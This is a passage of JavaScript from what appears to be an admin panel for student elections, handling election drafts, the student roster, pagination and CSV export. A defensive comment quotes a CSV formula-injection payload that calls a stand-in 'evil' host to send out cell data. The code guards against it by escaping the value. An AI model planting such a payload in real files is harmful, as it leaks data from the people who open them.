            ${syBadgeHtml(wizardDraft.targetSchoolYearLabel || '')}
            <button class="btn btn-secondary btn-sm" onclick="cancelWizard()">Cancel</button>
        </div>
        ${sections}
        <div class="wizard-footer">
            ${(!wizardDraft.id || wizardDraft.status === 'draft') ? `<button class="btn btn-secondary" onclick="saveDraftElection()">Save as Draft</button>` : '<div></div>'}
            <button class="btn btn-primary" onclick="finalizeElection()">${wizardDraft.id ? 'Save Changes' : 'Create Election'}</button>
        </div>
    `;
}

// Shows validation/save errors as a toast instead of a static banner
// pinned to the top of a (often long) form — a fixed banner up there
// gets scrolled out of view once the admin is deep into a multi-position
// candidate form, whereas a toast is always visible regardless of scroll
// position, and already follows dark/light mode like the rest of the UI.
// Field-level errors are still shown inline next to the specific input
// (see wizardInvalidFields above) — this is just the summary.
function showWizardError(msg){
    showToast(msg, 'error', { duration: 7000 });
}
// No-op now that errors show as a toast rather than a persistent banner —
// kept so existing call sites (e.g. saveDraftElection) don't need to change.
function clearWizardError(){}

function handlePhotoUpload(evt, posIdx, candIdx){
    const file = evt.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = e => {
        wizardDraft.positions[posIdx].candidates[candIdx].photo = e.target.result;
        const img = document.getElementById(`preview_${posIdx}_${candIdx}`);
        if (img) { img.src = e.target.result; img.style.opacity = 1; }
    };
    reader.readAsDataURL(file);
}

function buildElectionPayload(isDraftSave){
    return {
        csrf_token: CSRF_TOKEN,
        id: wizardDraft.id,
        type: wizardDraft.type,
        department: wizardDraft.department,
        name: wizardDraft.name,
        status: wizardDraft.status,
        start: wizardDraft.start,
        end: wizardDraft.end,
        results_visibility: wizardDraft.resultsVisibility,
        // target_school_year_id intentionally not sent: it's resolved
        // server-side to the upcoming school year (never admin-editable).
        parties_enabled: wizardDraft.partiesEnabled,
        parties: wizardDraft.parties,
        is_draft_save: !!isDraftSave,
        positions: wizardDraft.positions.map(p => ({
            title: p.title,
            winner_count: p.winner_count || 1,
            candidate_limit: p.candidate_limit || null,
            year_restriction: p.year_restriction || null,
            candidates: p.candidates.map(c => ({
                name: c.name,
                photo: c.photo,
                candidate_year: c.candidate_year,
                department: c.department,
                platform: c.platform,
                party: c.party,
            }))
        }))
    };
}

async function submitElection(payload, {isDraft} = {}){
    try {
        const method = wizardDraft.id ? 'PUT' : 'POST';
        const res = await fetch(ELECTIONS_API, {
            method: method,
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        const result = await res.json();
        if (res.ok && result.success) {
            const syLabel = wizardDraft.targetSchoolYearLabel || '';
            const syNote = syLabel ? ` (for school year ${syLabel})` : '';
            addLog(`${isDraft ? 'Saved draft' : (wizardDraft.id ? 'Updated' : 'Created')} election: ${wizardDraft.name || '(untitled)'}${syNote}`);
            if (!isDraft) {
                showToast(`${wizardDraft.id ? 'Election updated' : 'Election created'}${syNote}.`, 'success');
            }
            wizardDraft = null;
            wizardOriginalSnapshot = null;
            const listView = document.getElementById('electionListView');
            const wizardView = document.getElementById('electionWizardView');
            if (listView) listView.style.display = 'block';
            if (wizardView) wizardView.style.display = 'none';
            loadElectionList();
            showPanel('election');
        } else {
            showWizardError(result.error || 'Something went wrong.');
        }
    } catch (e) {
        showWizardError('Network error. Please try again.');
    }
}

async function finalizeElection(){
    wizardInvalidFields = new Set();
    const messages = [];
    if (wizardDraft.type === 'DSG' && wizardDraft.department) {
        wizardDraft.positions.forEach(pos => {
            if (pos.candidates) {
                pos.candidates.forEach(cand => { cand.department = wizardDraft.department; });
            }
        });
    }
    wizardDraft.positions.forEach((p, i) => {
        p.candidates.forEach((c, j) => {
            if (!c.name.trim()) {
                wizardInvalidFields.add(`cand_name_${i}_${j}`);
                messages.push(`Candidate ${j+1} in position "${p.title}" is missing a name.`);
            }
            if (!c.department) {
                wizardInvalidFields.add(`cand_department_${i}_${j}`);
                messages.push(`Candidate ${j+1} in position "${p.title}" needs a faculty.`);
            }
        });
    });
    if (messages.length) {
        renderWizard();
        showWizardError(messages.length === 1 ? messages[0] : `Please fix ${messages.length} issues: ${messages.join(' ')}`);
        return;
    }

    await submitElection(buildElectionPayload(false));
}

// Save as Draft — skips all the "must be complete" checks finalizeElection()
// does. The backend mirrors this: it only enforces a name and a type, and
// silently drops any position/candidate row that's still blank rather than
// rejecting the save, so admins can genuinely leave things half-filled-in
// and come back later via Edit.
async function saveDraftElection(){
    clearWizardError();
    if (!wizardDraft.name || !wizardDraft.name.trim()) {
        showWizardError('Give the election a name before saving it as a draft.');
        return;
    }
    if (!wizardDraft.type) {
        showWizardError('Choose an election type before saving it as a draft.');
        return;
    }
    await submitElection(buildElectionPayload(true), {isDraft: true});
}

// (saveSchedule, startElection, pauseElection, endElection, deleteElection,
// and viewElectionResults are defined earlier, right after renderElectionList.)

// ------------------------------------------------------------------
// STUDENTS PANEL (already uses API)
// ------------------------------------------------------------------
let studentFilters = { search:'', department:'', year:'', voter:'', account:'', election:'' };
let studentDraft = null;
let allStudentsCache = null;   // cached student list — avoids refetching on every keystroke/filter change
let studentPage = 1;
const STUDENTS_PER_PAGE = 15;
let lastFilteredStudents = []; // the filtered (but not yet paginated) list from the most recent render, used by CSV export

// Fetches the student list once and reuses it until something invalidates
// it (a create/edit/delete, or an explicit force refresh when the panel is
// opened). Typing in the search box or changing a filter dropdown just
// re-filters this cached array instead of hitting the API again.
async function fetchStudents(force = false){
    if (!force && allStudentsCache) return allStudentsCache;
    const res = await fetch(STUDENTS_API);
    allStudentsCache = await res.json();
    return allStudentsCache;
}

// Builds a CSV file from an array of student objects (as returned by the
// API) and triggers a browser download. Escapes quotes/commas per RFC 4180.
// Shared by every CSV download in this file (student export, the import
// template, and results export) so the blob/escaping logic lives in one
// place instead of being copy-pasted per feature.
function downloadCSV(filename, headers, rows){
    // RFC 4180 quoting alone does NOT stop spreadsheet formula
    // evaluation: a student who self-registers as
    // =HYPERLINK("http://evil/"&A1) gets that cell written verbatim
    // into the export, and it runs when an admin opens it in
    // Excel. Prefix formula-trigger characters with a quote.
    const csvEscape = v => {
        let s = String(v ?? '');
        if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
        return `"${s.replace(/"/g, '""')}"`;
    };
    const csv = [headers, ...rows].map(r => r.map(csvEscape).join(',')).join('\r\n');
    const blob = new Blob([csv], {type: 'text/csv;charset=utf-8;'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
}

// Admin-set lifecycle flag (see users.account_status / migration_schoolyear.sql).
// Distinct from registration_status (whether the ACCOUNT can log in) —
// this is about whether year progression should auto-advance normally or
// needs manual handling at the next school-year rollover.
const ACCOUNT_STATUS_LABEL = {
    normal: 'Normal',
    repeating: 'Repeating',
    undergrad_repeating: 'Undergrad (Repeating)',
    suspended_repeating: 'Suspended (Repeating)',
    dropped: 'Dropped',
    graduated: 'Graduated',
};

function exportStudentsCSV(students){
    if (!students.length) { showToast('Nothing to export for the current filters.', 'warning'); return; }
    const statusLabelMap = {active:'Active', suspended:'Suspended', unregistered:'Unregistered'};
    const headers = ['Student ID','Full Name','Email','Faculty','School Year','Year Level','Account Status','Lifecycle','Voted (any eligible election)'];
    const rows = students.map(s => {
        const st = voteStatusForStudent(s, studentFilters.election);
        const votedLabel = studentFilters.election ? (st.voted ? 'Yes' : 'No') : `${st.votedCount || 0}/${st.totalCount || 0}`;
        return [s.student_id, s.name, s.email || '', s.department || '', s.school_year_label || '', s.year_level || '', statusLabelMap[s.status] || s.status, ACCOUNT_STATUS_LABEL[s.account_status] || s.account_status || 'Normal', votedLabel];
    });
    downloadCSV(`students_${new Date().toISOString().slice(0,10)}.csv`, headers, rows);
    showToast(`Exported ${students.length} student${students.length === 1 ? '' : 's'} to CSV.`, 'success');
}

function blankStudentDraft(){
    return {
        id: null, studentId: '', fullName: '', department: '', schoolYearId: (activeSchoolYear || {}).id || null,
        yearLevel: (computeYearLevelClient((activeSchoolYear || {}).start_year).label || ''), email: '', status: 'active', accountStatus: 'normal',
        hasVoted: false, votedElectionIds: [], password: '',
    };
}

// A student who can actually cast a ballot right now: an active account
// that hasn't been marked dropped or graduated. This is the same
// definition results.php and electionTurnout() use, so every "out of N"
// denominator in the app agrees.
function isEligibleVoter(student){
    return student.status === 'active'
        && student.account_status !== 'dropped'
        && student.account_status !== 'graduated';
}

// Which elections is this student actually eligible for? SSG is open to
// everyone; a DSG election only applies to students in that department.
// Draft elections aren't visible to students yet, and archived elections
// are past cycles — neither counts toward anyone's current "X of Y voted"
// total. This mirrors the student dashboard's own election filter.
function eligibleElectionsForStudent(student){
    return currentElections.filter(e =>
        e.status !== 'draft' && e.status !== 'archived'
        && (e.type === 'SSG' || e.department === student.department)
    );
}

// Returns {votedCount, totalCount, label, cssClass} for the "All Elections"
// view, or {eligible, voted, label, cssClass} for a single selected election.
function voteStatusForStudent(student, electionFilter){
    if (electionFilter) {
        const election = currentElections.find(e => String(e.id) === String(electionFilter));
        const eligible = election
            && election.status !== 'draft'
            && election.status !== 'archived'
            && (election.type === 'SSG' || election.department === student.department);
        if (!eligible) return { eligible: false, voted: false, label: 'N/A', cssClass: 'unregistered' };
        const voted = (student.voted_election_ids || []).some(vid => String(vid) === String(election.id));
        return { eligible: true, voted, label: voted ? '✔ Voted' : 'Not Voted', cssClass: voted ? 'voted' : 'not-voted' };
    }
    const eligible = eligibleElectionsForStudent(student);
    const votedCount = eligible.filter(e => (student.voted_election_ids || []).some(vid => String(vid) === String(e.id))).length;
    if (eligible.length === 0) return { votedCount: 0, totalCount: 0, label: 'No elections yet', cssClass: 'unregistered' };
    const cssClass = votedCount === eligible.length ? 'voted' : (votedCount === 0 ? 'not-voted' : 'active');
    return { votedCount, totalCount: eligible.length, label: `${votedCount}/${eligible.length} voted`, cssClass };
}

async function renderStudentList(forceRefresh = false){
    // Skeleton placeholder while the (possibly cached) fetch resolves —
    // only shows real loading skeleton on a hard refresh, since a cached
    // re-filter resolves near-instantly and a flash would be worse than
    // nothing.
    if (forceRefresh || !allStudentsCache) {
        document.getElementById('panel-students').innerHTML = `
            <div class="skel-stats">${'<div class="skeleton skel-stat-box"></div>'.repeat(4)}</div>
            <div class="skeleton skel-card" style="height:60px;"></div>
            <div class="skeleton skel-card" style="height:340px;"></div>
        `;
    }
    try {
        const students = await fetchStudents(forceRefresh);
        const total = students.length;

        // "Voted" here follows whatever election is currently selected in
        // the filter — all elections (voted in at least one applicable
        // one) or one specific election.
        // Stats use the same eligible-voter definition as the dashboard
        // and results page. With a specific election selected, the
        // denominator is the students eligible for that election (SSG:
        // everyone active; DSG: that faculty), not the whole roster.
        const eligibleStudents = students.filter(isEligibleVoter);
        const selectedElection = studentFilters.election
            ? currentElections.find(e => String(e.id) === String(studentFilters.election))
            : null;
        const eligibleForStats = selectedElection
            ? eligibleStudents.filter(s => selectedElection.type === 'SSG' || s.department === selectedElection.department)
            : eligibleStudents;
        const voted = eligibleForStats.filter(s => {
            const st = voteStatusForStudent(s, studentFilters.election);
            return studentFilters.election ? st.voted : st.votedCount > 0;
        }).length;
        const notVoted = Math.max(eligibleForStats.length - voted, 0);
        const activeAccounts = students.filter(s => s.status === 'active').length;

        const filtered = students.filter(s => {
            if (studentFilters.search) {
                const q = studentFilters.search.toLowerCase();
                if (!s.name.toLowerCase().includes(q) && !s.student_id.toLowerCase().includes(q)) return false;
            }
            if (studentFilters.department && s.department !== studentFilters.department) return false;
            if (studentFilters.year && s.year_level !== studentFilters.year) return false;
            if (studentFilters.voter) {
                const st = voteStatusForStudent(s, studentFilters.election);
                const hasVoted = studentFilters.election ? st.voted : st.votedCount > 0;
                if (studentFilters.voter === 'voted' && !hasVoted) return false;
                if (studentFilters.voter === 'not-voted' && hasVoted) return false;
            }
            if (studentFilters.account && s.status !== studentFilters.account) return false;
            return true;
        }).sort((a,b) => a.name.localeCompare(b.name));
        lastFilteredStudents = filtered;

        // Paginate — keeps the DOM small even with a few thousand students.
        const totalPages = Math.max(1, Math.ceil(filtered.length / STUDENTS_PER_PAGE));
        if (studentPage > totalPages) studentPage = totalPages;
        if (studentPage < 1) studentPage = 1;
        const pageStart = (studentPage - 1) * STUDENTS_PER_PAGE;
        const pageItems = filtered.slice(pageStart, pageStart + STUDENTS_PER_PAGE);

        const statusLabelMap = {active:'Active', suspended:'Suspended', unregistered:'Unregistered'};

        const rows = pageItems.map(s => {
            const vs = voteStatusForStudent(s, studentFilters.election);
            return `
            <tr>
                <td title="${escapeHtml(s.student_id)}">${escapeHtml(s.student_id)}</td>
                <td class="name-cell" title="${escapeHtml(s.name)}${s.email ? ' - ' + escapeHtml(s.email) : ''}"><span class="name-cell-text"><span class="nm">${escapeHtml(s.name)}</span>${s.email ? `<div class="sub">${escapeHtml(s.email)}</div>` : ''}</span></td>
                <td title="${escapeHtml(s.department)}">${escapeHtml(s.department)}</td>
                <td title="${escapeHtml(s.school_year_label || '-')}">${escapeHtml(s.school_year_label || '-')}</td>
                <td>${escapeHtml(s.year_level || '-')}</td>
                <td title="${escapeHtml(vs.label)}"><span class="status-pill ${vs.cssClass}">${vs.label}</span></td>
                <td title="${escapeHtml(statusLabelMap[s.status] || s.status)}"><span class="status-pill ${escapeHtml(s.status)}">${escapeHtml(statusLabelMap[s.status] || s.status)}</span></td>
                <td title="${(s.account_status && s.account_status !== 'normal') ? escapeHtml(ACCOUNT_STATUS_LABEL[s.account_status] || s.account_status) : 'Normal'}">${(s.account_status && s.account_status !== 'normal') ? `<span class="status-pill suspended">${escapeHtml(ACCOUNT_STATUS_LABEL[s.account_status] || s.account_status)}</span>` : '<span class="status-pill normal">Normal</span>'}</td>
                <td>
                    <div class="row-actions">
                        <button title="Edit" onclick="editStudent(${s.id})">✎</button>
                    </div>
                </td>
            </tr>
        `; }).join('');

        const electionFilterOptions = currentElections
            .filter(e => e.status !== 'draft' && e.status !== 'archived')
            .map(e => `<option value="${e.id}" ${String(studentFilters.election)===String(e.id)?'selected':''}>${escapeHtml(e.name)}</option>`)
            .join('');

        const anyFilterActive = !!(studentFilters.search || studentFilters.department || studentFilters.year || studentFilters.voter || studentFilters.account || studentFilters.election);

        // A completely empty roster (first-run, no filters) gets a proper
        // "get started" prompt instead of a bare "no matches" table row.
        const emptyState = total === 0
            ? `<tr class="empty-row"><td colspan="9" style="padding:2.5rem 1rem;">
                    <div style="font-size:1.6rem;margin-bottom:.5rem;">🎓</div>
                    <div style="font-weight:600;color:var(--ink);margin-bottom:.25rem;">No students registered yet</div>
                    <div class="muted" style="font-size:.85rem;margin-bottom:1rem;">Add your first student to get started.</div>
                    <button class="btn btn-primary btn-sm" onclick="openRegisterStudent()">+ Register Student</button>
               </td></tr>`
            : `<tr class="empty-row"><td colspan="9">No students match your filters.</td></tr>`;

        // Clickable page numbers - every page when few, a windowed
        // "1 ... p-1 p p+1 ... n" when many; arrows stay at both ends.
        const pageNums = [];
        if (totalPages <= 7) {
            for (let n = 1; n <= totalPages; n++) pageNums.push(n);
        } else {
            pageNums.push(1);
            const from = Math.max(2, studentPage - 1);
            const to = Math.min(totalPages - 1, studentPage + 1);
            if (from > 2) pageNums.push('…');
            for (let n = from; n <= to; n++) pageNums.push(n);
            if (to < totalPages - 1) pageNums.push('…');
            pageNums.push(totalPages);
        }
        const pageButtons = pageNums.map(n => n === '…'
            ? '<span class="page-gap">…</span>'
            : `<button class="page-btn ${n === studentPage ? 'current' : ''}" onclick="goToStudentPage(${n})" ${n === studentPage ? 'aria-current="page"' : ''}>${n}</button>`).join('');

        // The bar stays visible whenever there is anything to page through,
        // even on a single page (arrows/page 1 disabled there) - the admin
        // should always see where records sit, not discover pagination only
        // after the roster crosses a threshold.
        const paginationBar = filtered.length > 0 ? `
            <div class="pagination-bar">
                <span class="page-info">Showing ${pageStart + 1}-${Math.min(pageStart + STUDENTS_PER_PAGE, filtered.length)} of ${filtered.length}</span>
                <div class="page-controls">
                    <button onclick="goToStudentPage(1)" ${studentPage<=1?'disabled':''} title="First page">&laquo;</button>
                    <button onclick="goToStudentPage(studentPage-1)" ${studentPage<=1?'disabled':''} title="Previous page">&lsaquo;</button>
                    ${pageButtons}
                    <button onclick="goToStudentPage(studentPage+1)" ${studentPage>=totalPages?'disabled':''} title="Next page">&rsaquo;</button>
                    <button onclick="goToStudentPage(${totalPages})" ${studentPage>=totalPages?'disabled':''} title="Last page">&raquo;</button>
                </div>
            </div>` : '';
        // Typing in the search box re-renders the whole panel on every
        // keystroke; without restoring focus + caret the input is destroyed
        // mid-word ("Aet" became "A" and dropped the admin back to the page).
        const searchEl = document.getElementById('stuSearch');
        const searchFocused = document.activeElement === searchEl;
        const searchCaret = searchFocused ? searchEl.selectionStart : null;

        document.getElementById('panel-students').innerHTML = `
            <div id="studentListView">
                <div class="stats-bar">
                    <div class="stat-box"><div class="stat-icon" style="background:rgba(59,130,246,.12);color:var(--blue);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div><div class="stat-number">${eligibleForStats.length}</div><div class="stat-label">Eligible Voters <span style="font-weight:400;">of ${total}</span></div></div>
                    <div class="stat-box"><div class="stat-icon" style="background:rgba(132,204,22,.14);color:var(--lime-dark);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div><div class="stat-number">${voted}</div><div class="stat-label">Voted${studentFilters.election ? ' (selected election)' : ' (at least 1)'}</div></div>
                    <div class="stat-box"><div class="stat-icon" style="background:rgba(245,158,11,.14);color:var(--amber);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15.5 14"/></svg></div><div class="stat-number">${notVoted}</div><div class="stat-label">Eligible, Not Yet Voted</div></div>
                    <div class="stat-box"><div class="stat-icon" style="background:rgba(20,184,166,.14);color:var(--teal);"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><div class="stat-number">${activeAccounts}</div><div class="stat-label">Active Accounts</div></div>
                </div>
                <div class="panel-flex-header">
                    <h2 class="section-title" style="margin:0;">Registered Students</h2>
                    <div style="display:flex;gap:.6rem;flex-wrap:wrap;">
                        <button class="btn btn-secondary" onclick="exportStudentsCSV(lastFilteredStudents)" title="Export the currently filtered list to CSV">⬇ Export CSV</button>
                        <button class="btn btn-primary" onclick="openRegisterStudent()">+ Register Student</button>
                    </div>
                </div>
                <div class="students-toolbar">
                    <input type="text" id="stuSearch" placeholder="Search by name or Student ID..." value="${escapeHtml(studentFilters.search)}" oninput="studentFilters.search=this.value; studentPage=1; renderStudentList();">
                    <select onchange="studentFilters.election=this.value; studentPage=1; renderStudentList();">
                        <option value="">All Elections</option>
                        ${electionFilterOptions}
                    </select>
                    <select onchange="studentFilters.department=this.value; studentPage=1; renderStudentList();">
                        <option value="">All Faculties</option>
                        ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${studentFilters.department===d?'selected':''}>${v}</option>`; }).join('')}
                    </select>
                    <select onchange="studentFilters.year=this.value; studentPage=1; renderStudentList();">
                        <option value="">All Year Levels</option>
                        ${yearOptions.map(y => `<option value="${y}" ${studentFilters.year===y?'selected':''}>${y}</option>`).join('')}
                    </select>
                    <select onchange="studentFilters.voter=this.value; studentPage=1; renderStudentList();">
                        <option value="">Voter Status: All</option>
                        <option value="voted" ${studentFilters.voter==='voted'?'selected':''}>Voted</option>
                        <option value="not-voted" ${studentFilters.voter==='not-voted'?'selected':''}>Not Voted</option>
                    </select>
                    <select onchange="studentFilters.account=this.value; studentPage=1; renderStudentList();">
                        <option value="">Account: All</option>
                        <option value="active" ${studentFilters.account==='active'?'selected':''}>Active</option>
                        <option value="unregistered" ${studentFilters.account==='unregistered'?'selected':''}>Unregistered</option>
                        <option value="suspended" ${studentFilters.account==='suspended'?'selected':''}>Suspended</option>
                    </select>
                </div>
                <div class="students-table-wrap">
                    <table class="students-table">
                        <colgroup>
                            <col style="width:10%"><col style="width:22%"><col style="width:18%"><col style="width:9%"><col style="width:8%"><col style="width:10%"><col style="width:8%"><col style="width:7%"><col style="width:6%">
                        </colgroup>
                        <thead><tr>
                            <th>Student ID</th><th>Full Name</th><th>Faculty</th><th>School Year</th><th>Year Level</th><th>Voter Status</th><th>Account</th><th>Lifecycle</th><th></th>
                        </tr></thead>
                        <tbody>${rows || emptyState}</tbody>
                    </table>
                    ${paginationBar}
                </div>
            </div>
            <div id="studentFormView" style="display:none;"></div>
        `;
        if (searchFocused) {
            const restored = document.getElementById('stuSearch');
            restored.focus();
            restored.setSelectionRange(searchCaret, searchCaret);
        }
    } catch (e) {
        document.getElementById('panel-students').innerHTML = '<div class="alert alert-error">Could not load students.</div>';
    }
}

function goToStudentPage(page){
    studentPage = page;
    renderStudentList();
}

function openRegisterStudent(){
    studentDraft = blankStudentDraft();
    document.getElementById('studentListView').style.display = 'none';
    document.getElementById('studentFormView').style.display = 'block';
    renderStudentForm();
}

async function editStudent(id){
    const students = await fetchStudents();
    const s = students.find(s => s.id === id);
    if (!s) return;
    studentDraft = {
        id: s.id,
        studentId: s.student_id,
        fullName: s.name,
        department: s.department || '',
        schoolYearId: s.school_year_id || null,
        yearLevel: s.year_level || '',
        email: s.email || '',
        status: s.status || 'active',
        accountStatus: s.account_status || 'normal',
        hasVoted: !!s.has_voted,
        votedElectionIds: s.voted_election_ids || [],
        password: '',
    };
    document.getElementById('studentListView').style.display = 'none';
    document.getElementById('studentFormView').style.display = 'block';
    renderStudentForm();
}

function cancelStudentForm(){
    studentDraft = null;
    document.getElementById('studentListView').style.display = 'block';
    document.getElementById('studentFormView').style.display = 'none';
    renderStudentList();
}

function renderStudentForm(){
    const isEdit = !!studentDraft.id;
    const computed = computeYearLevelClient(studentDraft.schoolYearId ? (schoolYearOptions.find(sy => sy.id === studentDraft.schoolYearId) || {}).start_year : null);

    document.getElementById('studentFormView').innerHTML = `
    <div class="wizard-topbar">
        <button class="back-btn" onclick="cancelStudentForm()">&larr; Back</button>
        <h2 class="section-title" style="margin:0;flex:1;">${isEdit ? 'Edit Student' : 'Register Student'}</h2>
        <button class="btn btn-secondary btn-sm" onclick="cancelStudentForm()">Cancel</button>
    </div>
    <div id="studentFormError"></div>
    <div class="wizard-section">
        <h3>Student Info</h3>
        <div class="two-col">
            <div class="form-row"><label>Student ID</label><input type="text" id="s_studentId" maxlength="20" value="${escapeHtml(studentDraft.studentId)}" oninput="studentDraft.studentId=this.value"></div>
            <div class="form-row"><label>Full Name</label><input type="text" id="s_fullName" maxlength="100" value="${escapeHtml(studentDraft.fullName)}" oninput="studentDraft.fullName=this.value"></div>
            <div class="form-row"><label>Faculty</label>
                <select id="s_department" onchange="studentDraft.department=this.value;">
                    <option value="">Select</option>
                    ${departmentOptions.map(d => { const v = escapeHtml(d); return `<option value="${v}" ${studentDraft.department===d?'selected':''}>${v}</option>`; }).join('')}
                </select>
            </div>
            <div class="form-row"><label>School Year Started</label>
                <select id="s_schoolYear" onchange="onStudentSchoolYearChange(this.value)">
                    <option value="">Select</option>
                    ${schoolYearOptions.map(sy => `<option value="${sy.id}" ${studentDraft.schoolYearId===sy.id?'selected':''}>${escapeHtml(sy.label)}${sy.is_active?' (current)':''}</option>`).join('')}
                </select>
                ${!schoolYearOptions.length ? '<p class="pw-hint">No school years set up yet — add one in Settings first.</p>' : ''}
            </div>
            <div class="form-row"><label>Year Level</label>
                ${(() => {
                    const locked = studentDraft.accountStatus === 'normal' && !!computed.label;
                    const opts = yearOptions.slice();
                    if (studentDraft.yearLevel && !opts.includes(studentDraft.yearLevel)) opts.push(studentDraft.yearLevel);
                    return `<select id="s_yearLevel" ${locked ? 'disabled' : ''} onchange="onStudentYearLevelChange(this.value)">
                        <option value="">${computed.blocked ? 'Select current year level' : 'Select'}</option>
                        ${opts.map(y => `<option value="${escapeHtml(y)}" ${studentDraft.yearLevel===y?'selected':''}>${escapeHtml(y)}</option>`).join('')}
                    </select>`;
                })()}
                <p class="pw-hint">${studentDraft.accountStatus === 'normal' && computed.label
                    ? 'Locked — computed from School Year. Set a repeater Lifecycle Status (or pick a different level) to edit it.'
                    : (computed.blocked
                        ? 'Past 4 years — pick their actual current level and a Lifecycle Status.'
                        : 'Editable for repeaters and undergrads. Picking a level that differs from the computed one switches Lifecycle to Repeating.')}</p>
            </div>
            <div class="form-row"><label>Email</label><input type="text" id="s_email" maxlength="100" value="${escapeHtml(studentDraft.email)}" oninput="studentDraft.email=this.value"></div>
            <div class="form-row"><label>Registration Status</label>
                <select id="s_status" onchange="studentDraft.status=this.value">
                    <option value="active" ${studentDraft.status==='active'?'selected':''}>Active</option>
                    <option value="unregistered" ${studentDraft.status==='unregistered'?'selected':''}>Unregistered</option>
                    <option value="suspended" ${studentDraft.status==='suspended'?'selected':''}>Suspended</option>
                </select>
                <p class="pw-hint">Whether this account can log in at all.</p>
            </div>
            <div class="form-row"><label>Lifecycle Status</label>
                <select id="s_accountStatus" onchange="onStudentLifecycleChange(this.value)">
                    ${Object.keys(ACCOUNT_STATUS_LABEL).map(k => `<option value="${k}" ${studentDraft.accountStatus===k?'selected':''}>${ACCOUNT_STATUS_LABEL[k]}</option>`).join('')}
                </select>
                <p class="pw-hint">Set this when a student repeats a year, drops, is suspended-but-still-enrolled, or graduates — it controls what happens at the June 1 school-year rollover.</p>
                ${studentDraft.accountStatus === 'graduated' ? `<p class="pw-hint" style="color:#b45309;">Auto-graduated accounts are also Suspended and cannot log in. Restoring a student who is actually still enrolled: pick a "still completing requirements" Lifecycle Status <em>and</em> set Registration Status to Active.</p>` : ''}
            </div>
        </div>
    </div>
    <div class="wizard-section">
        <h3>Password</h3>
        <div class="form-row" style="max-width:340px;">
            <label>${isEdit ? 'Set New Password (leave blank to keep current)' : 'Set Password (optional)'}</label>
            <div class="pw-field">
                <input type="password" id="s_password" value="${escapeHtml(studentDraft.password)}" oninput="studentDraft.password=this.value">
                <button type="button" class="pw-toggle-btn" onclick="toggleStudentPassword(this)">
                    <svg class="pw-icon-on" viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7Z"/><circle cx="12" cy="12" r="3"/></svg>
                    <svg class="pw-icon-off" viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a20.3 20.3 0 0 1 5.06-5.94M9.9 4.24A10.4 10.4 0 0 1 12 4c7 0 11 7 11 7a20.3 20.3 0 0 1-2.16 3.19M14.12 14.12a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                </button>
            </div>
            <p class="pw-hint">Passwords are hashed. Setting a new one marks account Active.</p>
        </div>
        ${isEdit ? `<div class="form-row" style="max-width:460px;">
            <label>Account Recovery</label>
            <button type="button" class="btn btn-danger btn-sm" onclick="resetStudentPassword()" title="Issue a one-time temporary password">Reset Password</button>
            <p class="pw-hint">Issues a one-time temporary password (shown once). The student must set a real password at their next login - voting stays locked until they do.</p>
        </div>` : ''}
    </div>
    ${isEdit ? `
    <div class="wizard-section">
        <h3>Voting Status</h3>
        ${(() => {
            const eligible = eligibleElectionsForStudent({department: studentDraft.department});
            if (!eligible.length) {
                return `<p class="muted" style="margin:0;">Not eligible for any active election yet.</p>`;
            }
            // Read-only status, sourced from ballot_submissions (via
            // voted_election_ids) so it matches the Students table, the
            // student dashboard, and the results page.
            return eligible.map(e => {
                const voted = studentDraft.votedElectionIds.some(vid => String(vid) === String(e.id));
                return `
                <div class="results-visibility-row">
                    <span style="flex:1;font-weight:600;font-size:.88rem;">${escapeHtml(e.name)}</span>
                    <span class="status-pill ${voted ? 'voted' : 'not-voted'}">${voted ? '✔ Voted' : 'Not voted'}</span>
                </div>`;
            }).join('');
        })()}
    </div>` : ''}
    <div class="wizard-footer">
        <div></div>
        <button class="btn btn-primary" onclick="saveStudent()">${isEdit ? 'Save Changes' : 'Register Student'}</button>
    </div>
    `;
}

function studentComputed(){
    const sy = schoolYearOptions.find(sy => sy.id === studentDraft.schoolYearId);
    return computeYearLevelClient(sy ? sy.start_year : null);
}
function onStudentSchoolYearChange(v){
    studentDraft.schoolYearId = v ? parseInt(v, 10) : null;
    const c = studentComputed();
    // Normal students always follow the computed level; for repeaters only fill
    // it in when empty, so a deliberate lower level is never overwritten.
    if (c.label && (studentDraft.accountStatus === 'normal' || !studentDraft.yearLevel)) studentDraft.yearLevel = c.label;
    renderStudentForm();
}
function onStudentYearLevelChange(v){
    studentDraft.yearLevel = v;
    const c = studentComputed();
    if (studentDraft.accountStatus === 'normal' && v && v !== c.label) {
        studentDraft.accountStatus = 'repeating'; // a suggestion — the admin can change it
        showToast('Level differs from the computed one, so Lifecycle was set to Repeating. Change it if needed.', 'info');
    }
    renderStudentForm();
}
function onStudentLifecycleChange(v){
    studentDraft.accountStatus = v;
    if (v === 'normal') {
        const c = studentComputed();
        if (c.label) studentDraft.yearLevel = c.label; // back to automatic: recompute + lock
    }
    renderStudentForm();
}

function toggleStudentPassword(btn){
    const input = document.getElementById('s_password');
    const isHidden = input.type === 'password';
